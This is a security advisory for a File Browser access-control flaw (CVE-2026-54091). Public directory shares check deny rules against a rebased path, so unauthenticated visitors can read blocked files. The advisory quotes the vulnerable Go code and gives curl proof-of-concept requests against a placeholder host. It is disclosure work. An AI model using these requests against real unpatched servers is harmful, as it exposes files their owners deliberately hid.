# [H] File Browser has incorrect access control for public directory shares via rule path rebasing

## Summary
Severity: High
Advisory: GHSA-j9jx-hp4c-ghhh
CVE: CVE-2026-54091
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-06-12
Source: https://github.com/advisories/GHSA-j9jx-hp4c-ghhh
Type: github-advisory

## Affected
- Go: `github.com/filebrowser/filebrowser/v2` — affected >=0 <2.63.6

## Details
### Summary
File Browser's public share handlers rebase the share owner's filesystem root to the shared directory and then evaluate descendant paths against the owner's global and per-user rules using the rebased relative path instead of the original path relative to the owner's scope.

As a result, an attacker who knows a public directory share URL can access files and subdirectories that the owner explicitly blocked with rules, as long as those blocked paths are located underneath the shared directory. In the simplest case this is an unauthenticated information disclosure through `GET /api/public/share/*` and `GET /api/public/dl/*`.

### Details
The public share flow first resolves the original shared path under the owner's filesystem, but then switches `d.user.Fs` to a new `BasePathFs` rooted at the shared directory. The follow-up authorization check is still performed by `d.Check`, which compares the request path to rule strings using prefix matching.

When the share target is a directory, the path passed to `d.Check` becomes relative to the shared directory, while the rules remain relative to the owner's original scope. A deny rule such as `/projects/private` therefore no longer matches a public share request for `/private/secret.txt`, even though the rebased filesystem resolves that request to the real path `/projects/private/secret.txt`.

Core vulnerable code path:

```go
// http/public.go
if file.IsDir {
    basePath = filepath.Clean(link.Path)
    filePath = ifPath
}

d.user.Fs = afero.NewBasePathFs(d.user.Fs, basePath)

file, err = files.NewFileInfo(&files.FileOptions{
    Fs:      d.user.Fs,
    Path:    filePath,
    Expand:  true,
    Checker: d,
})
```

```go
// http/data.go and rules/rules.go
func (d *data) Check(path string) bool {
    allow := true
    for _, rule := range d.settings.Rules {
        if rule.Matches(path) {
            allow = rule.Allow
        }
    }
    for _, rule := range d.user.Rules {
        if rule.Matches(path) {
            allow = rule.Allow
        }
    }
    return allow
}

func (r *Rule) Matches(path string) bool {
    if path == r.Path {
        return true
    }
    prefix := r.Path
    if prefix != "/" && !strings.HasSuffix(prefix, "/") {
        prefix += "/"
    }
    return strings.HasPrefix(path, prefix)
}
```

The issue is reachable from the public endpoints registered in `http/http.go` for `/api/public/share/*` and `/api/public/dl/*`.

### PoC
The attacker only needs a directory share URL. No authenticated session is required if the share is not password protected.

Reproduction flow:

1. Prepare a directory owned by a normal user, for example `/projects/`.
2. Inside it, create a sensitive child path such as `/projects/private/secret.txt`.
3. Configure a deny rule for the share owner that blocks `/projects/private`.
4. Have the owner create a public share for `/projects/`.
5. Request the blocked child path through the public share endpoints.

PoC:

```bash
# owner creates a public share for /projects/
curl -s -X POST 'http://HOST/api/share/projects/' \
  -H 'X-Auth: <OWNER_JWT>' \
  -H 'Content-Type: application/json' \
  -d '{}'
```

The response contains a share hash such as:

```text
{"hash":"<HASH>","path":"/projects/","userID":2,"expire":0}
```

The attacker can then access a rule-blocked file below the shared directory:

```bash
curl -i 'http://HOST/api/public/dl/<HASH>/private/secret.txt'
```

A blocked subdirectory can also be listed directly:

```bash
curl -i 'http://HOST/api/public/share/<HASH>/private/'
```

the server returns `200 OK` and serves the file content or directory listing, even though the share owner's rules should have made that path inaccessible.

### Impact
This flaw allows public share recipients to read files and browse directories that the share owner explicitly intended to block with File Browser rules. Because the vulnerable path is the public share feature, the exposure can be unauthenticated and internet-reachable whenever a share link is exposed.

In practical deployments, this can disclose secrets, configuration files, backup material, private project directories, or any other content that administrators or users attempted to hide beneath a shared parent directory using the built-in rule system.

## References
- https://github.com/filebrowser/filebrowser/security/advisories/GHSA-j9jx-hp4c-ghhh
- https://nvd.nist.gov/vuln/detail/CVE-2026-54091
- https://github.com/filebrowser/filebrowser/commit/e07c59df0b850f5924d5b1683e8609661ddcf534
- https://github.com/filebrowser/filebrowser
- https://github.com/filebrowser/filebrowser/releases/tag/v2.63.6
